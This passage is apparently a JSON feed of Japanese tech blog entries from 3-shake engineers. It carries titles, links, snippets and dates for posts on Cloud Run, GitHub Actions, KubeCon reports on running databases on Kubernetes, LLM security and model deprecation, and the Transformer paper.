Yasumoto","authorId":"atusy"},{"title":"「Cloud Run functions」にコンテナがデプロイできるの知ってる？","link":"https://zenn.dev/kimitsu/articles/deploy-container-to-cloud-run-functions","contentSnippet":"!本記事はネタ記事です！Cloud Run functions は Google Cloud の FaaS です。ユーザはコンテナ、ランタイム、Web サーバーを管理することなく、コードを書くだけでデプロイすることができます。本来はコンテナ化が不要な Cloud Run functions ですが、コンテナをデプロイできることをご存知でしょうか。 Cloud Run functions の仕組みユーザが Cloud Run functions にデプロイしたコードは複数の抽象化レイヤーの上で動きます。[1]一番内側にユーザが書いたコードがあり、その下にはまず Func...","isoDate":"2024-12-08T13:16:22.000Z","dateMiliSeconds":1733663782000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【GitHub Actions】編集されたディレクトリに応じてラベルを付与する","link":"https://zenn.dev/kamos/articles/16def632754577","contentSnippet":"はじめに最近になってTerraformを触る機会が少し増えてきました。そのリポジトリはdevelopment, staging, productionのそれぞれのディレクトリがありました。.└── environments    ├── development    │   ├── main.tf    │   └── xxx.tf    ├── staging    │   ├── main.tf    │   └── xxx.tf    └── production        ├── main.tf        └── xxx.tfこの構成では環境...","isoDate":"2024-12-08T13:14:28.000Z","dateMiliSeconds":1733663668000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":" KubeCon NA 2024: The Future of DBaaS on Kubernetesのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/08/kubecon_na_the_future_of_dbaas_ob_kubernetes","contentSnippet":"この記事は以下アドベントカレンダー8日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2The Future of DBaaS on Kubernetesのセッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kL/the-future-of-dbaas-on-kubernetes-melissa-logan-constantia-sergey-pronin-percona-deepthi-sigireddi-planetscale-gabriele-bartolini-edbセッション動画:https://www.youtube.com/watch?v=Z35SlsYd1ds「The Future of DBaaS on Kubernetes」は、Data on Kubernetes Communityのメンバーによるパネルディスカッション形式で、Kubernetes上で動作するDBaaSの将来について議論されました。ここ数年でデータベースをKubernetes上で動かすにあたりどう便利になったか？セッションでは、Kubernetesにおけるストレージとネットワーキングの進化が、データベース運用を大きく改善した点が強調されました。Volume Snapshotなどのストレージ関連機能の向上は、バックアップとリカバリといったDay 2 Operationを効率化し、Local Persistent Volumeの導入と改善は、データベースの高可用性とディザスタリカバリ構成をシンプルに実現可能にしました。また、Cilium Network PolicyやIngress/Egressといったネットワーキング機能は、マルチテナントサービスにおけるアクセス制御を容易にし、セキュリティ強化に貢献しています。これらの改善により、増加するデータベースと、優秀なデータベースエンジニア不足という課題に対し、Kubernetesは少ない人員でデータベースをスケールさせる有効な手段となっています。数年前に比べ、Kubernetes上でのデータベース運用はより現実的になり、エンタープライズグレードの運用にも耐えうるレベルに達しています。これは、Kubernetesがステートレスなアプリケーションだけでなく、ステートフルなデータベースにも適したプラットフォームへと進化したことを示しています。私がKubernetesを触り始めた時点ではここで紹介されているほとんどの機能はサポートされており、なぜKubernetesでデータベースを運用することが難しいのかを理解しきれない面がありました。このセクションによる直近のデータベース観点でのKubernetesのアップデートの紹介により、何が障壁でそれがどのように解決されたのかの理解が深まりました。Kubernetes上でデータベースを動かしている顧客についてシェアできる事例はあるか？セッションでは、Nokia、Broadcom、HubSpot、Shopify、IBMなど、様々な企業がKubernetes上でデータベースを運用している事例が紹介されました。これらの事例は、マイクロサービスアーキテクチャの普及と密接に関連しています。マイクロサービス化されたアプリケーションでは、単一のモノリシックなデータベースではなく、サービスごとにデータベースを持つ傾向があり、Kubernetesはそのような分散データベース環境の構築と管理を容易にします。特に、開発者がデータベースを所有し、インフラ管理者がDBaaSをインターフェイスとしてデータベースを払い出すという新しい運用モデルは、今後の主流となる可能性を示唆しています。これは、DevOpsの原則をデータベース運用に取り入れることで、開発速度と運用効率を向上させるアプローチと言えるでしょう。セクション内で紹介されている開発者がデータベースを所有し、インフラ管理者がデータベースを払い出すという体制はパブリッククラウドで運用されるマイクロサービスアーキテクチャでは当たり前のように実践されており、Kubernetesでも今後の主流となると考えることは不思議ではないでしょう。そしてそれは従来のVMやベアメタルベースのDBAがデータベース管理を行うには多すぎるデータベースが運用され、限界を迎えることは想像に難くなく、KubernetesとOperatorによる運用の簡略化は必須と言えるかもしれません。Kubernetes上でデータベースを動かすにあたりベストプラクティスはなにか？ベストプラクティスとして、クラウド中立性、クラウドレディネス、セルフサービス、セキュリティ、アーキテクチャ設計などが挙げられました。Operatorの活用は、クラウドベンダーに依存しない運用を実現する上で重要であり、UI/APIの整備やArgoCDなどのツールとの連携により、データベースのプロビジョニングと管理を自動化できます。また、開発者が容易にスケーリングやテスト環境構築を行えるセルフサービス環境も重要です。セキュリティについては、業界標準やコンプライアンス要件に合わせたポリシー設定が不可欠です。アーキテクチャ設計では、PostgreSQLを例に、Kubernetesの機能を活用した高可用性構成や、複数のアベイラビリティゾーンを考慮した設計が重要となります。さらに、Kubernetesの標準APIを活用することで、オブザーバビリティやセキュリティ、証明書の管理を簡素化し、他のコンポーネントとの統合を容易にすることが推奨されています。VMからの移行時には、ストレージを分離することでリソース管理の予測精度を高めることが重要です。ここではベストプラクティスとしてユーザーがセルフサービスでデータベースを立ち上げる方法としてGUIとAPIとツール連携による自動化二つの観点が出ていました。個人的にはパブリッククラウドとIaCの流れを見るにGUIベースよりAPIによる自動化が主流になっていくのではないかと考えます。またデータベースではないですがオンプレミスのVMベースシステムからKubernetesのコンテナベースに移行するプロジェクトに関わった時は独自のプロトコルによる通信をVMで実装しており、その方法をコンテナの世界に持ち込もうとした結果非常に複雑になっていた事例を見たことがあります。そのため、ここで紹介されているKubernetesとそのエコシステムに合わせることは不可欠ではないかと感じます。データベースをKubenetesで動かす場合の課題や落とし穴はあるか？セッションでは、VM環境での運用とKubernetes環境での運用を混同してしまうこと、マイグレーション計画の不足、リソースの過剰確保、そして人材育成の課題が議論されました。既存のVM向けスクリプトをそのままKubernetesに適用しようとするのではなく、クラウドネイティブな考え方を取り入れ、スケーラビリティと信頼性の向上に焦点を当てるべきです。マイグレーションにおいては、全てのワークロードの移行と、ダウンタイム最小化を両立するための綿密な計画が必要です。リソース管理においては、Kubernetesの柔軟性を活かし、適切なリソース割り当てを行うための実験と調整が重要です。さらに、DBAがKubernetesの基礎知識を習得し、データベース運用における新たなパラダイムシフトに対応できるよう、人材育成に力を入れる必要があります。このセッションを通して一番に感じたのはオンプレからパブリッククラウドへの移行と気にするところは同じだということと、DBAとKubernetesの距離を近づけることはやはり大事だということでした。特にDBAとKubernetesについてはより簡単なソリューションとして存在してしまっているマネージドデータベースが、Kubernetesを利用することから目を背けさせてしまう要因になっていると感じます。しかしDBAがより求められるのはデータベースをセルフホストする場合で、今後DBAとして活躍していくにはLinuxに適応してきたようにKubernetesに適応していく日強うがあると考えています。DBaaSの将来はどのように変わっていくと考えるか？将来のDBaaSは、Kubernetesとの統合がさらに深まり、データベースとKubernetesの境界が曖昧になっていくと予測されています。PostgreSQLの例では、Kubernetesとの親和性を高めるためのパッチ適用や、拡張機能のコンテナ化などが進んでいます。また、プライベートDBaaSだけでなく、商用DBaaSのKubernetes上での提供も増加し、データベースサービスの利用がさらに容易になると考えられます。Google Cloudなどのクラウドプロバイダーも、将来的にKubernetes上でマネージドデータベースサービスを提供する可能性があり、これにより、数千規模のデータベース管理が容易になるでしょう。Kubernetesの普及と成熟に伴い、Helm ChartやYAML以外の、より洗練されたUXも期待されます。セッション内ではGoogle CloudではCloud SQLがKubenetes1で運用される未来があるかもしれないと言及していましたが、すでにSpannerはKubernetesで動いています。商用DBaaSがKubernetesで動くことについてはよくある構成ですが、プライベートDBaaSがKubernetes上で動き、さまざまなエコシステムと組み合わせてAPIベースなど自動化に適したUXが提供されていくことには非常に注目しています。まとめ「The Future of DBaaS on Kubernetes」セッションは、Kubernetes上でのデータベース運用が成熟期を迎えていることを示しました。ストレージとネットワーキングの進化、Operatorの普及、そして様々な企業での成功事例は、Kubernetesがデータベース運用のための堅牢でスケーラブルなプラットフォームであることを証明しています。クラウドネイティブなアプローチ、セルフサービス化、セキュリティ強化、そして適切なアーキテクチャ設計は、Kubernetes上でのデータベース運用を成功させるための鍵となります。同時に、VM環境からの移行、リソース管理、人材育成といった課題にも適切に対処する必要があります。今後のDBaaSは、Kubernetesとの統合がさらに進み、データベースサービスの利用がより容易になると期待されます。このセッションで得られた知見は、今後のデータベース運用戦略策定に役立つ貴重な情報源となるでしょう。特に、オンプレミスでマイクロサービスアーキテクチャを採用する組織にとって、Kubernetesはデータベース運用における重要な選択肢となるでしょう。↩","isoDate":"2024-12-08T03:00:00.000Z","dateMiliSeconds":1733626800000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2024: When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/11/when_life_gives_you_containers_make_an_open_source_rds_a_kubernetes_love_story","contentSnippet":"この記事は以下アドベントカレンダー11日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconaセッション動画:https://www.youtube.com/watch?v=0gSSmdNB-Zoこのセッションは、オープンソースRDS、あるいはオープンソースDBaaSをKubernetes上で構築・運用する道のりを、物語風に語っています。セッションを通して、Kubernetes上でデータベースを運用することへの不安や課題を解消し、そのメリットと可能性を提示することを目指していると感じました。なぜKubernetesでデータベースを動かすのか？セッション冒頭では、スピーカーが4年前はKubernetesでデータベースを動かすことに懐疑的だったものの、現在は大きく考えが変わっていることが語られています。その理由として、クラウドニュートラル戦略、コスト削減、そして自動化の3点が挙げられています。特に自動化は、高可用性構成、Blue/Greenデプロイ、フェイルオーバーなどを容易にする点で重要です。これらのメリットは、マイクロサービスアーキテクチャやクラウドネイティブ開発において、データベース運用を効率化し、DevOps実践を促進する上で大きな力となります。従来の運用では、データベースのデプロイや管理に多くの手作業が必要でしたが、Kubernetesと自動化ツールを組み合わせることで、これらの作業を大幅に簡素化し、開発スピードの向上に貢献できます。一方、Kubernetes上でのデータベース運用に対する懸念として、パフォーマンスの劣化、Kubernetes自体の成熟度、そして複雑さが挙げられています。これらの懸念は、データベースエンジニアとして当然抱くものであり、セッション全体を通してこれらの懸念への回答が提示されています。このセクションでは、Kubernetes上でデータベースを運用する上でのメリットと課題が明確に示されており、導入を検討する上で重要なポイントが提示されています。特に、クラウドネイティブな環境におけるデータベース運用の重要性が強調されていました。また単純なメリット・デメリット以上にユーザーの感情面にフォーカスしているところが印象的でした。Chapter 1: Enthusiasm and Kubernetes 101: Kubernetesの基本と進化この章では、Kubernetes上でデータベースを動かすための基本的なステップが段階的に示されています。Pod、Persistent Volume Claim (PVC)、Service、Secret、ConfigMap、StatefulSet、そしてHA構成のためのエージェントとProxyの導入といった流れは、Kubernetesにおけるデータベース運用の進化を理解する上で非常に有用です。特に、StatefulSetの導入は、データベースのようなステートフルアプリケーションの運用において大きな進歩です。Podの順序付けられたデプロイ、安定したネットワークID、永続ストレージへのアクセスなど、StatefulSetが提供する機能は、データベースの高可用性と安定運用に不可欠です。しかし、これらの構成要素を手作業で管理することは複雑でエラーを起こしやすいため、IaCの導入が推奨されています。IaCを用いることで、インフラストラクチャのコード化、自動化、バージョン管理が可能となり、再現性と信頼性の高いデプロイを実現できます。TerraformやAnsible、ArgoCD、HelmなどのIaCツールは、Kubernetesの構成管理を簡素化し、複数環境へのデプロイを容易にします。これは、DevOpsの原則である「Infrastructure as Code」を実践する上で非常に重要なステップです。この章では、Kubernetes上でデータベースを動かすための基本的な構成要素と、IaCの重要性が説明されています。IaCを用いることで、複雑なKubernetes環境を効率的に管理し、再現性と信頼性を向上させることができる点が強調されていました。またIaCのパラメータを変更することで複数環境をデプロイできるところからDBaaSの最初の一歩を踏み出したととらえることができました。Chapter 2: Disillusionment and Operators 101: OperatorによるDay 2 Operationの簡素化IaCによってデプロイは容易になりますが、運用、つまりDay 2 Operationは依然として複雑です。アップグレード、スケーリング、フェイルオーバー、バックアップ、モニタリング、メンテナンス、リカバリといったタスクは、手作業で行うと大きな負担となります。ここでOperatorが登場します。Operatorは、Kubernetesの拡張機能であり、特定のアプリケーションのデプロイと管理を自動化します。データベースOperatorは、データベースのライフサイクル全体を管理し、Day 2 Operationを大幅に簡素化します。Operatorの導入により、データベース管理者はKubernetesの内部構造を深く理解する必要がなくなり、データベース運用に集中できます。これは、運用コストの削減と効率性の向上に大きく貢献します。また、Operatorは宣言的な設定をサポートしており、運用作業の自動化と標準化を促進します。しかし、Operatorだけでは真のDBaaSとは言えません。セルフサービスポータル、マルチクラスタ対応、詳細なモニタリング、課金機能など、DBaaSに必要な機能は多岐に渡ります。この章では、OperatorがDay 2 Operationを簡素化する上で重要な役割を果たすことが説明されています。Operatorは、データベース管理者の負担を軽減し、運用効率を向上させる強力なツールです。これはデータベースエンジニアといわれるロールが採用市場に少ない日本では特に重要な点です。大規模なデータベース運用に合わせてデータベースエンジニアの採用を増やすことは難しいため、様々なツールを利用して負荷を下げ、省力化し、より本質的な業務を行う必要があるためです。一方でOperatorだけではDBaaSの全てをカバーできない点にも注意が必要です。Chapter 3: Hope and DBaaS: Percona Everestの紹介Percona Everestは、オープンソースのDBaaSソリューションであり、Kubernetes上でデータベースサービスを提供します。ReactとMaterial UIで構築された直感的なUI、Golangで実装されたバックエンド、そしてAPIによるアクセスを提供することで、ユーザーフレンドリーな操作性を実現しています。Everestのアーキテクチャは、複数のOperatorをOperator Managerで管理する構造を採用しています。これにより、Operatorのバージョン管理、依存関係の解決、相互運用性の確保が容易になります。ユーザーは、GUIまたはAPIを介してデータベースサービスを操作し、そのリクエストはEverest Operatorによって各データベースOperatorに変換されます。Everestは、オープンソースDBaaSとして、ベンダーロックインを回避し、柔軟なデータベース運用を可能にします。また、コミュニティベースの開発により、迅速な機能追加とバグ修正が期待できます。この章では、Percona EverestがオープンソースDBaaSとして、Kubernetes上でデータベースサービスを提供する仕組みが説明されています。Everestは、ユーザーフレンドリーなUI、Operator ManagerによるOperator管理、そしてオープンソースとしてのメリットを提供することで、柔軟で効率的なデータベース運用を支援します。セッション中ではGUIやAPIは利用しない導入例もあると話されており、個人的にはKubernetesリソースの管理に余計なUIを追加する方法は大規模化したときにデメリットが増えるのではないかと感じました。またこのセッションのスピーカーはPerconaのエンジニアであるためある程度ポジショントークが含まれているであろうことも注意が必要です。Epilogue: Kubernetesとデータベースの未来セッションの締めくくりとして、Kubernetes上でのデータベース運用は困難な側面もあるものの、OperatorやDBaaSソリューションの活用により、効率的でスケーラブルな運用が可能になることが強調されています。Kubernetes上でデータベースを運用することは、もはや一部の先進的な企業だけの選択肢ではなく、一般的な選択肢になりつつあります。クラウドネイティブな環境でデータベースを運用することは、ビジネスの俊敏性と競争力を高める上で重要な要素となります。Kubernetes上でのデータベース運用に対する不安や懸念を解消し、その可能性を示す上で非常に有益な内容でした。Percona EverestのようなオープンソースDBaaSソリューションの登場は、Kubernetesにおけるデータベース運用の楽にする選択肢の一つと言えるでしょう。まとめこのセッションを通して、Kubernetes上でのデータベース運用は、進化を続け、成熟しつつあることが理解できました。初期の懸念は解消されつつあり、OperatorやDBaaSソリューションの登場により、運用効率とスケーラビリティが大幅に向上しています。特に定型的なデプロイと運用を自動化できることでデータベースエンジニアはアプリケーション特性に応じた最適化やリリースマネジメントといったユーザーに価値を提供することを最大化することに注力することができます。今後、Kubernetes上でのデータベース運用はさらに普及し、クラウドネイティブなアプリケーション開発の中核を担うことになるでしょう。一定以上の規模の組織ではオンプレ回帰やクラウドコストの最小化といった観点からKubernetes上にデータベースをホストするソリューションが求められ生ます。そのためデータベースエンジニアは、Kubernetesの基礎知識を習得し、OperatorやDBaaSソリューションの活用方法を学ぶことで、より効率的で本質的な業務を遂行できるようになるはずです。","isoDate":"2024-12-08T02:42:58.000Z","dateMiliSeconds":1733625778000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"バッチ処理をCloud RunからCloud Run jobsに変更してみた話","link":"https://qiita.com/bayobayo0324/items/71f7e19a051261d1adfc","contentSnippet":"この記事は3-shake Advent Calendar 2024 シリーズ1の8日目の記事ですはじめましてあるいはこんにちは、@bayobayo0324 です。株式会社スリーシェイクでクラウド…","isoDate":"2024-12-07T22:06:20.000Z","dateMiliSeconds":1733609180000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"私とJagu\'e\'rと2025年から...","link":"https://blog.masasuzu.net/entry/2024/12/08/000000","contentSnippet":"この記事はJagu\'e\'r Advent Calendar 2024の8日目の記事です。日付的には大遅刻です。特に技術的な話はしません。思い出話とこれからの意気込みを書きます。Jagu\'e\'r(Japan Google Cloud Usergroup for Enterprise) は、Google Cloudのユーザー企業やパートナー企業が集まるユーザー会です。私はパートナー企業であるスリーシェイクに所属し、Jagu\'e\'rに参加しています。実は入会自体は結構前で、メールを遡ると2023年8月10日でした。当時Google Cloudに関わる案件が始まり、情報収集のために登録した記憶があります。しかし、「Enterprise」や「分科会」といった言葉から、何となく堅苦しいイメージを抱いてしまい、Slackには入ったものの、あまり活動には参加していませんでした。転機が訪れたのは、今年2024年の春から夏頃のこと。同僚が分科会の運営に入り、別の同僚もJagu\'e\'rのMeetupで発表するようになったんです。身近な人が関わるようになると、自然と興味が湧いてきて、今年の後半はオンライン・オフライン問わず、Meetupに参加するようになりました。そして先日、Jagu\'e\'r Park \'24 Winter!に参加しました。そこで行われたJagu\'e\'r Award選出のためのピッチ発表に、私は深く感銘を受けました。どの発表者の方も、Jagu\'e\'rコミュニティへの熱い思いや感謝の気持ちが溢れていて、本当に心を動かされました。特に、中外製薬の方とDatadogの方のピッチは強く印象に残っています。これまでJagu\'e\'rコミュニティに深く関わってきませんでしたが、こんなにも熱い思いを持つ人たちと一緒に活動したい！という気持ちが湧き上がってきました。「善は急げ」と、ピッチを聞いたその場で、社内でJagu\'e\'rの分科会運営に携わっている人に連絡を取り、運営を手伝えないか相談しました。さらに懇親会では、弊社担当のGoogle Cloudパートナーエンジニアの方にも相談し、同じ分科会の運営の方につなげてもらいました。問題がなければ、来年から某分科会の運営に携わる予定です。正直なところ、勢いで走り出した部分もあるので、まだ何ができるか、何をしていきたいかは漠然としています。それでも、来年はコミュニティの活性化に貢献できるような成果を残せるよう、精一杯頑張りたいと思っています。","isoDate":"2024-12-07T15:00:00.000Z","dateMiliSeconds":1733583600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Lima+containerd+nerdctlで作るコンテナ環境/lima_containerd_nerdctl","link":"https://speakerdeck.com/moz_sec_/lima-containerd-nerdctl-1","contentSnippet":"","isoDate":"2024-12-07T05:00:00.000Z","dateMiliSeconds":1733547600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"セキュアな LLM アプリ開発：OWASP Top 10 for LLM 2025 と Vertex AI による実践","link":"https://zenn.dev/kimitsu/articles/owasp-for-llm-2025-and-vertex-ai","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 7 日目の記事です。 はじめにOWASP Top 10 for LLM Applications の 2025 年版が 11 月 18 日に発表されました。[1]OWASP Top 10 は Web アプリケーションのセキュリティリスクの中で最も重要な 10 個をリスト化したものであり、OWASP Top 10 for LLM Applications は名前の通り LLM を利用したアプリケーションに関するものです。本家は数年に一度の改訂ですが、こちらは LLM の技術進歩が早いためほぼ毎年...","isoDate":"2024-12-07T00:14:53.000Z","dateMiliSeconds":1733530493000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"CUDAを利用したプログラムの高速化とNvidia Container Toolkit","link":"https://sreake.com/blog/cuda-nvidia-container-toolkit/","contentSnippet":"はじめに Sreake事業部インターン生の高島陸斗です。インターン生としてSRE技術の調査・検証を行っています。私は、情報系の大学院生で、普段は数値解析に関する研究をしています。学部時代は、今回のブログ内容とも関係する並 […]The post CUDAを利用したプログラムの高速化とNvidia Container Toolkit first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-06T01:51:20.000Z","dateMiliSeconds":1733449880000,"authorName":"Sreake","authorId":"Sreake"},{"title":"「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇","link":"https://sreake.com/blog/sre_kaigi_2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に在籍するエンジニアが、2025年1月26日（日）に開催される「SRE Kaigi 2025」にセッション登壇することをお知らせします。The post 「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-05T01:00:00.000Z","dateMiliSeconds":1733360400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"構造化ログのスキーマを考えてみる","link":"https://blog.atusy.net/2024/12/04/log-schema/","contentSnippet":"ログ設計初心者なりに、分析しやすいログってなにかなと考えてみた。","isoDate":"2024-12-04T00:00:00.000Z","dateMiliSeconds":1733270400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"argocd コマンドで別ブランチとの差分を確認する","link":"https://qiita.com/yteraoka/items/aea03d50288375f85183","contentSnippet":"ArgoCD の GitOps で Merge 前に manifest の差分を見たいArgoCD は Application リソースで source に指定した Git などの定義と実際に K…","isoDate":"2024-12-03T15:14:17.000Z","dateMiliSeconds":1733238857000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"LLMのモデル更新や廃止による影響を考える","link":"https://shu-kob.hateblo.jp/entry/2024/12/03/232856","contentSnippet":"この記事は、MLOps（LLMOps、生成AIOps） Advent Calendar 2024 4日目の記事です。生成AIの普及により、アプリケーションに組み込んで実運用を始めた方も増えてきたと思います。LLMOpsをする中で気をつけたいことを考えてみました。モデルの更新まず、思い浮かぶのがモデルの更新よる影響です。モデルの更新によって性能が上がるなどのメリットを享受できる反面、挙動変更によって、困ることもあります。私の場合、システムの実運用では無いですが、LLM技術書のサンプルコードが動かなくなる事態がありました。06_agent/agent_5.py で2回目の実行結果が正しく表示されません \xb7 Issue #3 \xb7 harukaxq/langchain-book \xb7 GitHubgpt-3.5-turboをAgentとして使用したときの挙動が変わったという内容です。アプリに組み込んでいたら、機能が使えなくなる可能性があり、使えなくなった場合の代替案も用意しておく必要があると考えました。また、LLMのリリース情報もウォッチしておく必要があるでしょう。Geminiはリリースの最新情報を日本語で提供しています。gemini.google.comChatGPTはリリースノートを英語のみですが提供しています。ChatGPT — Release Notes | OpenAI Help CenterAnthropic製品（Claude）のリリースノートは日本語で提供されています。docs.anthropic.comモデルの廃止モデルの廃止もウォッチする必要があるでしょう。GPT-3.5 Turbo終了はニュースになりました。xtech.nikkei.com↑日経クロステックの有料会員記事ですが、会員でなくても1ページ目で内容は把握できます。learn.microsoft.comAzure OpenAIでは、GPTの各種マイナーバージョンが提供されていますが、適宜廃止になるので注意が必要です。廃止になる場合、モデルのVersion UPが必要なので、早めに開発環境でVersion UPしたモデルの挙動確認をする必要があるでしょう。Version UPしたモデルだと、LLMの利用料が高くなることも念頭に置いて、コスト試算しましょう。まとめモデル更新や廃止を早く知るために、LLM公式サイトのリリースノートなどのウォッチをして、早めに対策をしましょう。","isoDate":"2024-12-03T14:28:56.000Z","dateMiliSeconds":1733236136000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Transformer論文を生成AIで要約してみた","link":"https://shu-kob.hateblo.jp/entry/2024/12/02/233507","contentSnippet":"この記事は生成AI Advent Calendar 2024の3日目の記事です。AIの歴史は60年ほどで、「冬の時代」と呼ばれる停滞期もありましたが、昨今の生成AIの発展は「Transformer」と呼ばれる論文から始まりました。この「Transformer」論文をわかりやすいように生成AIに要約させてみました。arxiv.org「Transformer」論文は上記サイトで見ることができます。論文の正式名称は「Attention Is All You Need」で、現在 v7。右側のAccess Paper:から閲覧することができます。なお、PDFの直リンクはこちらGoogle CloudのVertex AIでGeminiに要約させた結果は以下です。プロンプト「この論文を日本語で高校3年生レベルにもわかるように要約してください。」この論文は、「Transformer」という、機械翻訳などのシーケンス変換タスクに革新をもたらした新しいニューラルネットワークアーキテクチャを提案しています。高校3年生にもわかるように要約すると、以下のようになります。従来の機械翻訳の問題点:従来の機械翻訳は、RNN（再帰型ニューラルネットワーク）という技術を主に使っていました。RNNは文章を単語ごとに順番に処理していくため、長い文章だと処理に時間がかかります。また、並列処理が難しいため、計算速度を上げるのが困難でした。Transformerの革新的な点:Transformerは、「Attention（注意機構）」という仕組みに完全に基づいており、RNNのような順番に処理する仕組みを完全に排除しました。Attention機構は、翻訳したい単語を生成する際に、入力文全体の中でどの単語に注目すべきかを判断する仕組みです。人間の翻訳作業で例えると、翻訳する際に原文の関連する部分に注目するのと同じような働きをします。この仕組みにより、以下の利点が生まれました。並列処理が可能: 単語を順番に処理する必要がないため、並列処理が可能になり、計算速度が大幅に向上しました。長い文章への対応力向上: RNNでは、文章が長くなるほど精度が落ちやすいという問題がありましたが、Attention機構は入力文全体を一度に見ることができるため、長い文章でも高い精度を維持できます。Transformerの成果:Transformerは、従来のモデルよりも高い精度を達成し、さらに学習時間も大幅に短縮しました。具体的には、英語からドイツ語への翻訳と英語からフランス語への翻訳タスクで、当時の最高精度を更新しました。Transformerの仕組みを簡単に説明すると:Transformerは、エンコーダとデコーダという2つの部分から構成されています。エンコーダ: 入力文を解析し、各単語の意味をベクトル表現に変換します。デコーダ: エンコーダの出力とAttention機構を利用して、翻訳文を生成します。エンコーダとデコーダは、それぞれ複数の層が積み重なった構造になっています。各層は、Attention機構と全結合層という2つのサブ層から構成されています。Transformerの今後の展望:Transformerは、テキスト以外のデータ（画像、音声、動画など）にも応用できる可能性があり、様々な分野での活用が期待されています。また、文章生成をより効率的に行うための研究も進められています。簡単に言うと、Transformerは、人間の「注意」の仕組みに似た仕組みを使って、従来よりも高速で高精度な機械翻訳を実現した画期的な技術です。","isoDate":"2024-12-02T14:35:07.000Z","dateMiliSeconds":1733150107000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年の崖から考える我々のパーパス（序章）","link":"https://shu-kob.hateblo.jp/entry/2024/12/01/232229","contentSnippet":"はじめにこの記事は3-shake Advent Calendar 2024 シリーズ1の2日目の記事です。1日目はシリーズ1がYutaro ShirayamaさんのポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する2日目はシリーズ2がYoshinori Teraokaさんのvector で kubernetes の container log を CloudWatch Logs に転送するでした。なお、シリーズ2の2日目はshingo919さんの 九州旅行記（ドライブでの九州一週旅行は大変だった！）です。2025年の崖今回は「2025年の崖」について軽くご紹介したいと思います。いよいよ2025年になりますが、ITでは「2025年の崖」という言葉が存在します。2025年の崖がある中で、スリーシェイクのSreake事業部が果たす役割を考えていきたいと思います。「2025年の崖」をググったら色々出てきますが、経済産業省のレポートが1次情報源的かつわかりやすいでしょう。www.meti.go.jpなお、DXレポート ～ITシステム「2025年の崖」の克服とDXの本格的な展開～（サマリー）はスライド5枚にまとまっており、さっと読みやすいです。「2025年の崖」は要するに何なのかというと、IT人材が不足しており、レガシーシステムを保守するのに限界が来ている。DXも推進しないといけない。何とかしないともう後が無い。という状況。2015年時点で、IT人材の不足が約17万人とされていたところ、2025年には約43万人にまで上ります。既存のレガシーシステムの保守がブラックボックス、属人的になっており、DX化の足枷に → デジタル競争の敗者に技術的負債が溜まる一方保守運用の担い手不足で、サイバーセキュリティ事故が起きやすくこんな厳しい状況を打破するには、ユーザとベンダーそれぞれで対策していく必要があります。ユーザは人材・資金を保守からDXにシフトベンダーも同様に人材・資金を保守からDXにシフトベンダーはAI、アジャイル、マイクロサービス等最新技術を用いたビジネスにシフトやることはわかっていても、そう簡単にはいきません。ただし、スリーシェイクのSreake事業では、内製化支援も行っており、これまで数々の企業様の支援を行ってまいりました。Sreakeという商材は難しく、入社して1年が経った私もストンと腹落ちできる説明ができないままでしたが、「2025年の崖」をどう克服するかが我々のパーパスだと感じました。私は生成AIアプリケーション開発支援というDXを担当しておりますが、案件の推進を通して、「DX推進」を語れるようになっていきたいと思います。今回は、序章のような形で今後も2025年の崖について書いていければと思います。次の3-shake Advent Calendar 2024はシリーズ1がkechigonさんの「Google Cloud monitoringのアラートをGitHub issueに通知する」シリーズ2がtryu___さんの「kubebuilder使ってpodの監視してみた」です。","isoDate":"2024-12-01T14:22:29.000Z","dateMiliSeconds":1733062949000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"vector で kubernetes の container log を CloudWatch Logs に転送する","link":"https://qiita.com/yteraoka/items/df0777cdcb403a7af750","contentSnippet":"Vector とはvector は timber とともに買収され datadog がメンテナンスしているオープンソースプロジェクトのようです。(Datadog acquires Timber T…","isoDate":"2024-12-01T12:20:46.000Z","dateMiliSeconds":1733055646000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"週刊アトデ 2024-12-01","link":"https://blog.atusy.net/2024/12/01/atodeyomanakata/","contentSnippet":"アトデヨム、ウソジャナイ、ヨムノタノシー","isoDate":"2024-12-01T00:00:00.000Z","dateMiliSeconds":1733011200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Geminiのビジネス利用でのメリットを語る","link":"https://shu-kob.hateblo.jp/entry/2024/11/30/233039","contentSnippet":"この記事はGCP(Google Cloud Platform) Advent Calendar 2024 1日目の記事です。2024年はIT業界にとって、最も話題に上がったトピックは生成AIだったのではないでしょうか？2023年までは生成AIと家は、ChatGPTでしたが、2024年はGoogleがBardをリブランディングして、Gemini（ジェミニ）とし、しのぎを削っています。私はGoogle 